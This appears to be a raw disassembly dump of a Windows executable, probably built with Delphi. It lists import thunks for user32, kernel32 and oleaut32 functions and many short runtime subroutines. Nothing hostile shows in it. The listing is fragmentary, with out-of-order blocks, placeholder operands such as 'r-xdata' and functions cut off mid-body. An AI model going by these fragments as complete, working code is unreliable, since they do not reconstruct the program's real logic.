jmp [ SetKeyboardState@IAT ]
SetMenuItemInfoA
jmp [ SetMenuItemInfoA@IAT ]
SetParent
jmp [ __import_lookup_table_9(user32:SetParent) ]
SetScrollInfo
jmp [ __import_lookup_table_9(user32:SetScrollInfo) ]
SetScrollPos
jmp [ SetScrollPos@IAT ]
SetScrollRange
jmp [ SetScrollRange@IAT ]
SetTimer
jmp [ SetTimer@IAT ]
SetWindowPlacement
jmp [ SetWindowPlacement@IAT ]
SetWindowTextA
jmp [ __import_lookup_table_9(user32:SetWindowTextA) ]
SetWindowsHookExA
jmp [ __import_lookup_table_9(user32:SetWindowsHookExA) ]
ShowCursor
jmp [ __import_lookup_table_9(user32:ShowCursor) ]
ShowOwnedPopups
jmp [ __import_lookup_table_9(user32:ShowOwnedPopups) ]
ShowScrollBar
jmp [ ShowScrollBar@IAT ]
TrackPopupMenu
jmp [ TrackPopupMenu@IAT ]
TranslateMDISysAccel
jmp [ TranslateMDISysAccel@IAT ]
TranslateMessage
jmp [ TranslateMessage@IAT ]
UnhookWindowsHookEx
jmp [ UnhookWindowsHookEx@IAT ]
UnregisterClassA
jmp [ UnregisterClassA@IAT ]
UpdateWindow
jmp [ UpdateWindow@IAT ]
WaitMessage
jmp [ WaitMessage@IAT ]
WinHelpA
jmp [ WinHelpA@IAT ]
WindowFromPoint
jmp [ WindowFromPoint@IAT ]
sub_406a80
and eax 0xff
and edx 0xff
shl edx 0x8
or ax dx
retn
sub_406aa0
movzx eax ax
shr eax 0x8
retn
sub_406aa8
call GetTickCount
retn
sub_406ab0
xor eax eax
retn
sub_406ab4
push edx
push eax
call GlobalAlloc
push eax
call GlobalLock
retn
sub_406ac4
push ecx
push edx
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalReAlloc
push eax
call GlobalLock
retn
sub_406ae0
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalFree
retn
sub_406af4
shl edx 0x8
and edx 0xff000000
or eax edx
retn
sub_406b2c
call sub_406a94
retn
sub_406b34
call sub_406a94
retn
CreateWindowExA
jmp [ __import_lookup_table_9(user32:CreateWindowExA) ]
sub_406d11
jmp sub_403924
sub_406d18
pop ebp
retn
sub_406d1c
sub [ rw-data ] 0x1
retn
sub_406d49
jmp sub_403924
sub_406d50
pop ebp
retn
sub_406d54
sub [ rw-data ] 0x1
retn
sub_407079
jmp sub_403924
sub_407080
pop ebp
retn
sub_407084
sub [ rw-data ] 0x1
retn
sub_407b41
add eax 0xffffffd4
jmp sub_40d168
sub_407b51
add eax 0xffffffd4
jmp sub_40d0ac
sub_407b63
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405860
sub_407b6d
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405874
sub_407c44
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b920
call sub_40395c
pop ebx
retn
sub_407f1c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_407ee4
test eax eax
sete al
pop esi
pop ebx
retn
sub_408454
call sub_408430
retn
sub_4084ec
push eax
call CloseHandle
retn
sub_4086bc
mov edx edi
mov edi eax
mov ecx 0xffffffff
xor al al
[ edi ]
lea eax [ edi - 0x1 ]
mov edi edx
retn
sub_4086d0
push esi
mov esi eax
xchg edx eax
call sub_4028d8
mov eax esi
pop esi
retn
sub_408890
push ebx
mov ebx eax
add ebx 0x4
mov eax ebx
call sub_4026dc
mov [ eax ] ebx
add eax 0x4
pop ebx
retn
sub_4088a4
sub eax 0x4
mov eax [ eax ]
sub eax 0x4
retn
sub_4088dc
test eax eax
je r-xdata
retn
sub eax 0x4
mov edx [ eax ]
call sub_4026fc
sub_408944
push ebx
mov ecx [ rw-data ]
cmp [ ecx ] 0x0
je r-xdata
mov al 0x10
call sub_402838
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
pop ebx
retn
sub_408968
push ebx
mov ebx eax
mov eax ebx
call sub_403f20
pop ebx
retn
sub_408ccb
push ebx
push eax
lea eax [ ebp - 0x14 ]
mov ebx [ ebp - 0x4 ]
call sub_403f20
pop eax
pop ebx
retn
sub_408f83
cmp [ ebp - 0x2a ] 0x0
je r-xdata
retn
mov al 0x2d
stosb [ edi ]
sub_4090de
push esi
mov esi [ ebp - 0xc ]
test esi esi
je r-xdata
pop esi
retn
mov ecx [ esi - 0x4 ]
[ edi ] [ esi ]
sub_40943b
lodsb [ esi ]
or al al
je r-xdata
dec esi
retn
cmp al 0x20
je sub_40943b
sub_4094f8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4043e0
mov edx esi
xor ecx ecx
call sub_409384
pop esi
pop ebx
retn
sub_40956c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4043e0
mov edx esi
mov cl 0x1
call sub_409384
pop esi
pop ebx
retn
sub_409dde
jmp sub_403924
sub_409de5
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_409ed6
jmp sub_403924
sub_409edd
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a681
jmp sub_403924
sub_40a688
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a728
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
call sub_40a6b4
pop ebp
retn 0x8
sub_40a86d
jmp sub_403924
sub_40a874
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_40ad17
jmp sub_403924
sub_40ad1e
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b26b
jmp sub_403924
sub_40b272
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b31d
jmp sub_403924
sub_40b324
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_40b3c7
jmp sub_403924
sub_40b3ce
pop esi
pop ecx
pop ebp
retn
sub_40b5aa
jmp sub_403924
sub_40b5b1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b608
test eax eax
je r-xdata
retn
sub eax 0x1000
sub_40b8fa
jmp sub_403924
sub_40b9c8
jmp sub_403924
sub_40b9f0
cmp [ eax + 0xc ] 0x0
je r-xdata
retn
call sub_403144
sub_40bb8c
jmp sub_403924
sub_40bb93
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40bb9c
mov esp ecx
mov [ esp ] edx
mov ebp [ ebp ]
jmp sub_40395c
sub_40bba9
retn
sub_40bbac
push ebp
mov ebp esp
call sub_40baf0
lea ecx [ ebp + 0x8 ]
add ecx 0x4
mov edx [ ebp + 0x8 ]
call sub_40bb9c
pop ebp
retn 0x4
sub_40bbc8
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b920
call sub_40395c
retn
sub_40bc60
push ebx
mov ebx eax
mov eax ebx
call sub_40bbe0
and eax 0xff
mov eax [ eax * 8 + rw-data ]
pop ebx
retn
sub_40be33
jmp sub_403924
sub_40be3a
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40beff
jmp sub_403924
sub_40bf06
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40bf10
call sub_40b79c
mov eax 0x1
call sub_403f08
sub_40c094
cmp eax [ rw-data ]
jl r-xdata
mov al 0x1
retn
cmp eax [ rw-data ]
jne r-xdata
xor eax eax
retn
cmp edx [ rw-data ]
jle r-xdata
sub_40c16d
jmp sub_403924
sub_40c18a
jmp sub_403924
sub_40c191
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40c23c
xor ecx ecx
cmp [ rw-data ] 0x0
je r-xdata
mov eax ecx
retn
call sub_40c1a0
mov ecx eax
sub_40c428
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
pop ebx
retn
push ebx
call CharNextA
sub eax ebx
pop ebx
retn
sub_40c448
push eax
call CharNextA
retn
sub_40c6f8
jmp sub_403924
sub_40c6ff
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40c768
mov eax [ rw-data ]
cmp eax 0x1f
ja r-xdata
setb al
retn
bt [ rw-data ] eax
sub_40cbbf
jmp sub_403924
sub_40cbc6
pop ebx
mov esp ebp
pop ebp
retn
Sleep
jmp [ __import_lookup_table_10(kernel32:Sleep) ]
sub_40cd04
jmp sub_403924
sub_40cd0b
pop ebx
mov esp ebp
pop ebp
retn
sub_40cd10
push ebx
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_40cc74
sub_40cd20
push ebx
mov al 0x1
mov ebx [ rw-data ]
jmp r-xdata
test al al
je r-xdata
pop ebx
retn
test ebx ebx
jne r-xdata
call [ ebx + 0x4 ]
mov ebx [ ebx ]
sub_40cd3c
push ebx
mov ebx rw-data
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx [ eax ]
mov [ ebx ] edx
mov edx 0x8
call sub_4026fc
pop ebx
retn
sub_40cdc4
mov edx 0xffffffff
xchg edx eax
[ edx ] eax
dec eax
retn
sub_40cdd0
xchg [ eax ] edx
mov eax edx
retn
sub_40ce30
push ebp
mov ebp esp
push ecx
call GetCurrentThreadId
mov [ ebp - 0x2 ] ax
mov al [ ebp - 0x2 ]
xor al [ ebp - 0x1 ]
and al 0xf
pop ecx
pop ebp
retn
sub_40cec0
mov eax [ edx ]
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov eax [ edx ]
xor edx edx
mov [ eax + 0x8 ] edx
retn
sub_40cfd8
mov eax [ eax + 0x10 ]
push eax
call SetEvent
retn
sub_40d000
mov edx [ eax + 0x18 ]
push edx
mov eax [ eax + 0x14 ]
push eax
call WaitForSingleObject
retn
sub_40d27b
jmp sub_403924
sub_40d282
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_40d2f0
jmp sub_403924
sub_40d2f7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d315
mov eax [ ebp - 0xc ]
push eax
call SetErrorMode
retn
sub_40d30e
jmp sub_403924
sub_40d315
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40d765
jmp sub_403924
sub_40d76c
pop ebp
retn
sub_40d7d8
jmp sub_403924
sub_40d7df
pop ebp
retn
VariantChangeType
jmp [ VariantChangeType@IAT ]
sub_40d858
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x10
sub_40d8be
jmp sub_403924
sub_40d8c5
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d92a
jmp sub_403924
sub_40d931
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d996
jmp sub_403924
sub_40d99d
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40da02
jmp sub_403924
sub_40da09
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40da6e
jmp sub_403924
sub_40da75
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40daed
jmp sub_403924
sub_40daf4
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
sub_40db60
jmp sub_403924
sub_40db67
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40dbd0
jmp sub_403924
sub_40dbd7
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40dc44
jmp sub_403924
sub_40dc4b
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
SafeArrayCreate
jmp [ SafeArrayCreate@IAT ]
SafeArrayGetLBound
jmp [ SafeArrayGetLBound@IAT ]
SafeArrayGetUBound
jmp [ __import_lookup_table_11(oleaut32:SafeArrayGetUBound) ]
sub_40dfd1
jmp sub_403924
sub_40dfd8
pop ebp
retn
sub_40dfdc
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_40dca0
sub_40dfed
add [ esp + 0x4 ] 0xfffffff8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax ]
sub_40e676
jmp sub_403924
sub_40e67d
pop ecx
pop ebp
retn
sub_40e70f
jmp sub_403924
sub_40e716
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40e766
jmp sub_403924
sub_40e76d
pop ecx
pop ebp
retn
sub_40e7ba
jmp sub_403924
sub_40e7c1
pop ecx
pop ebp
retn
sub_40e853
jmp sub_403924
sub_40e85a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40e8aa
jmp sub_403924
sub_40e8b1
pop ecx
pop ebp
retn
sub_40eaf9
jmp sub_403924
sub_40eb00
pop ebx
mov esp ebp
pop ebp
retn
sub_40ec16
jmp sub_403924
sub_40ec1d
pop ecx
pop ebp
retn
sub_40ec20
push ebx
mov ebx eax
mov eax ebx
call sub_40eeb8
mov [ ebx ] 0x1
pop ebx
retn
sub_40eecc
push eax
call sub_40eeb8
pop eax
retn
sub_40f12c
call sub_40f1e0
retn
sub_40f280
jmp sub_403924
sub_40f287
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f2ce
jmp sub_403924
sub_40f2d5
pop ebx
pop ecx
pop ebp
retn
sub_40f31a
jmp sub_403924
sub_40f321
pop ebx
pop ecx
pop ebp
retn
sub_40f366
jmp sub_403924
sub_40f36d
pop ebx
pop ecx
pop ebp
retn
sub_40f3b2
jmp sub_403924
sub_40f3b9
pop ebx
pop ecx
pop ebp
retn
sub_40f77b
jmp sub_403924
sub_40f782
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40f81c
jmp sub_403924
sub_40f823
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40fc91
jmp sub_403670
sub_40fd4c
jmp sub_403670
sub_40fdf3
jmp sub_403670
sub_40feec
jmp sub_403670
sub_40ffc5
jmp sub_403670
sub_4100ad
jmp sub_403670
sub_41026a
jmp sub_403924
sub_410271
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4102d3
jmp sub_403924
sub_4102da
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410740
jmp sub_403670
sub_41082f
jmp sub_403924
sub_410836
mov al [ ebp - 0x1 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4108d4
jmp sub_403924
sub_4108db
mov al [ ebp - 0x1 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410c78
call sub_410930
neg al
sbb eax eax
neg eax
retn
sub_410d39
jmp sub_403924
sub_410d40
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410de9
jmp sub_403924
sub_410df0
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411341
jmp sub_403670
sub_411448
jmp sub_403924
sub_41144f
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411559
jmp sub_403924
sub_411560
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4119b0
jmp sub_403924
sub_4119b7
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411ac1
jmp sub_403924
sub_411ac8
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_41200e
jmp sub_403924
sub_412015
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4120b9
jmp sub_403924
sub_4120c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4120e2
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_404618
retn
sub_4120db
jmp sub_403924
sub_4120e2
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41213e
jmp sub_403924
sub_412145
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4121c1
jmp sub_403924
sub_412707
jmp sub_403924
sub_41270e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4127a1
jmp sub_403924
sub_4127a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4127c5
lea eax [ ebp - 0x14 ]
call sub_404600
retn
sub_4127be
jmp sub_403924
sub_4127c5
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412822
jmp sub_403924
sub_412829
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4128cb
jmp sub_403924
sub_4128e8
jmp sub_403924
sub_4128ef
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_412e4a
jmp sub_403924
sub_412e51
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412ec2
jmp sub_403924
sub_412ec9
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413254
push eax
call sub_40eeb8
pop eax
mov [ eax ] 0x7
fstp [ eax + 0x8 ]
fwait
retn
sub_413268
push eax
call sub_40eeb8
pop eax
mov [ eax ] 0x6
fistp [ eax + 0x8 ]
fwait
retn
sub_4133f3
jmp sub_403924
sub_41341f
jmp sub_403924
sub_413426
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413653
jmp sub_403924
sub_41365a
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4138fb
jmp sub_403924
sub_413989
jmp sub_403924
sub_413a79
jmp sub_403924
sub_413b1b
jmp sub_403924
sub_413bd1
jmp sub_403924
sub_413c78
cmp [ eax ] 0x8
jb r-xdata
retn
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov [ eax ] 0x0
mov edx esp
call sub_40f1e0
add esp 0x10
sub_413f22
jmp sub_403924
sub_413f29
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413f6c
mov ax [ eax ]
retn
sub_41406c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40eeb8
mov [ ebx ] 0xa
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
sub_414084
mov edx 0x80020004
call sub_41406c
retn
sub_4140d4
mov dl 0x1
call sub_4140dc
retn
sub_414189
jmp sub_403924
sub_414190
pop esi
pop ebx
pop ebp
retn
sub_414194
push ebp
mov ebp esp
call sub_414354
pop ebp
retn 0x4
sub_414220
push ebp
mov ebp esp
call sub_414354
pop ebp
retn 0x4
sub_414303
jmp sub_403924
sub_41430a
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_403180
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_403544
sub_41432c
xor eax eax
retn
sub_414330
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_414344
mov [ ecx ] 0x8
mov al 0x1
retn
sub_41434c
call sub_40e62c
retn
sub_414354
call sub_40e71c
retn
sub_41435c
call sub_40ebcc
retn
sub_414364
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_414378
call sub_414354
retn
sub_414380
push ebp
mov ebp esp
call sub_41435c
pop ebp
retn 0x8
sub_414398
push ebp
mov ebp esp
or eax 0xffffffff
pop ebp
retn 0x4
sub_414474
jmp sub_403924
sub_41453d
jmp sub_403924
sub_414544
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414561
lea eax [ ebp - 0x10 ]
call sub_403f20
retn
sub_41455a
jmp sub_403924
sub_414561
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41456c
call sub_40ec20
retn
sub_414574
mov ecx 0xe
call sub_413c10
cmp al 0x1
retn
sub_4145f3
jmp sub_403924
sub_4145fa
pop ebp
retn
sub_41469d
jmp sub_403924
sub_4146a4
pop ebp
retn
sub_4147bd
jmp sub_403924
sub_4147c4
pop ebp
retn
sub_4147c8
sub [ rw-data ] 0x1
retn
sub_4148c6
jmp sub_403924
sub_4148cd
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_414bec
push ebx
add esp 0xffffff00
mov ebx ecx
push 0xff
lea ecx [ esp + 0x4 ]
call sub_414b54
mov eax ebx
mov edx esp
call sub_404184
add esp 0x100
pop ebx
retn
sub_414c48
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_403f74
pop esi
pop ebx
retn
sub_414d24
jmp sub_403924
sub_414d2b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_414d7c
jmp sub_403924
sub_414d83
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_414ed0
jmp sub_403924
sub_414ed7
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414fa6
jmp sub_403924
sub_414fad
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4152c4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_40f1e0
pop esi
pop ebx
retn
sub_41556e
jmp sub_403924
sub_415575
pop ebp
retn
sub_415578
sub [ rw-data ] 0x1
retn
sub_4155a5
jmp sub_403924
sub_4155ac
pop ebp
retn
sub_4155b0
sub [ rw-data ] 0x1
retn
sub_416685
add [ esp + 0x4 ] 0xffffffec
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x8 ]
sub_416e24
push ecx
mov [ esp ] ax
mov [ esp + 0x2 ] dx
mov eax [ esp ]
pop edx
retn
sub_416f48
mov eax [ eax + 0xc ]
call sub_418314
retn
sub_41721f
jmp sub_403924
sub_417226
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41722c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_4184cc
test eax eax
setge al
pop esi
pop ebx
retn
sub_41752f
jmp sub_403924
sub_417536
mov esp ebp
pop ebp
retn
sub_417604
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_417610
push ebx
mov ebx edx
mov edx ebx
call sub_417424
test eax eax
je r-xdata
pop ebx
retn
mov edx ebx
call sub_417184
sub_4176bc
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_417817
jmp sub_403924
sub_4178eb
jmp sub_403924
sub_4178fc
mov eax [ eax - 0x38 ]
or eax eax
je r-xdata
retn
mov eax [ eax + 0x2 ]
sub_417968
jmp sub_403924
sub_41796f
pop ebx
mov esp ebp
pop ebp
retn
sub_4179ba
jmp sub_403924
sub_4179c1
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_417a4d
jmp sub_403924
sub_417a54
pop ebx
pop ebp
retn
sub_417a9a
jmp sub_403924
sub_417aa1
pop ebx
pop ebp
retn
sub_417ae6
jmp sub_403924
sub_417aed
pop ebx
pop ebp
retn
sub_417b37
jmp sub_403924
sub_417b3e
pop esi
pop ebx
pop ebp
retn
sub_417b92
jmp sub_403924
sub_417b99
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_417cc6
jmp sub_403924
sub_417d42
jmp sub_403924
sub_417e18
cmp [ rw-data ] 0x0
je r-xdata
retn
mov edx eax
mov eax [ rw-data ]
call sub_41860c
sub_417f08
jmp sub_403924
sub_418092
jmp sub_403924
sub_418099
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418133
jmp sub_403924
sub_41813a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418159
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_418152
jmp sub_403924
sub_418159
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
sub_4181c5
jmp sub_403924
sub_4181cc
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4182c4
jmp sub_403924
sub_4182cb
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403190
retn
sub_4182e1
jmp sub_403924
sub_418348
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_418668
xor edx edx
mov eax ebx
call sub_41862c
pop ebx
retn
sub_4183c0
mov eax [ ebp + 0x4 ]
retn
sub_4183f6
pop ecx
pop edx
pop esi
pop ebx
retn
sub_418444
jmp sub_403924
sub_41844b
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_418450
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub_418468
xor edx edx
call sub_418470
retn
sub_418558
mov edx [ eax + 0x8 ]
dec edx
call sub_418470
retn
sub_4186d8
retn
sub_418792
jmp sub_403924
sub_418799
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_403544
sub_418828
jmp sub_403924
sub_41882f
pop ebx
pop ecx
pop ebp
retn
sub_418834
push ebx
mov ebx eax
lea eax [ ebx + 0x8 ]
push eax
call EnterCriticalSection
mov eax [ ebx + 0x4 ]
pop ebx
retn
sub_41888b
jmp sub_403924
sub_418892
pop ebx
pop ecx
pop ebp
retn
sub_418898
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_4188d4
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b920
call sub_40395c
retn
sub_4188ec
mov ecx eax
cmp edx eax
jge r-xdata
mov eax ecx
retn
mov ecx edx
sub_4189c7
retn
sub_4189c8
cmp edx [ eax + 0x4 ]
jae sub_4188d4
mov eax [ eax + 0x8 ]
bt [ eax ] edx
sbb eax eax
and eax 0x1
retn
sub_418a84
test edx edx
je r-xdata
xor edx edx
call sub_418a98
retn
xchg edx eax
mov ecx [ eax ]
call [ ecx ]
retn
sub_418b4e
jmp sub_403924
sub_418b55
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418b68
xchg edx eax
call sub_418a98
retn
sub_418b70
retn
sub_418c09
jmp sub_403924
sub_418c10
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418dcd
jmp sub_403924
sub_418dd4
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_418f3d
jmp sub_403924
sub_418f44
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418f88
xor edx edx
call sub_418e44
retn
sub_4190f6
jmp sub_403924
sub_419110
inc [ eax + 0xc ]
retn
sub_419114
cmp [ eax + 0xc ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x1c ]
sub_41917e
jmp sub_403924
sub_41918c
dec [ eax + 0xc ]
call sub_419114
retn
sub_4191c8
xor eax eax
retn
sub_4191cc
push ebx
mov ebx ecx
mov eax ebx
call sub_403f20
pop ebx
retn
sub_419200
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_418470
pop esi
pop ebx
retn
sub_4192c2
jmp sub_403924
sub_4192c9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4193d9
jmp sub_403924
sub_4194b4
retn
sub_4194b8
retn
sub_4194bc
retn
sub_4194c0
retn
sub_4195ea
jmp sub_403924
sub_4195f1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41960e
lea eax [ ebp - 0xc ]
call sub_403f20
retn
sub_419607
jmp sub_403924
sub_41960e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419698
jmp sub_403924
sub_4196b0
push ebx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
inc [ ebx + 0x8 ]
pop ebx
retn
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_41976c
dec [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_419815
jmp sub_403924
sub_41981c
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419828
mov eax [ ebp + 0x4 ]
retn
sub_41985e
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4198ac
jmp sub_403924
sub_4198b3
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_419972
jmp sub_403924
sub_419979
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41999b
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f44
retn
sub_419994
jmp sub_403924
sub_41999b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4199a4
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_4199ac
xor eax eax
retn
sub_4199f5
jmp sub_403924
sub_4199fc
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_419b0f
jmp sub_403924
sub_419b16
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419ba4
jmp sub_403924
sub_419bab
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419c7b
jmp sub_403924
sub_419c82
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419d38
jmp sub_403924
sub_419d3f
pop esi
pop ecx
pop ebp
retn
sub_419dc4
jmp sub_403924
sub_419dcb
xor eax eax
pop edx
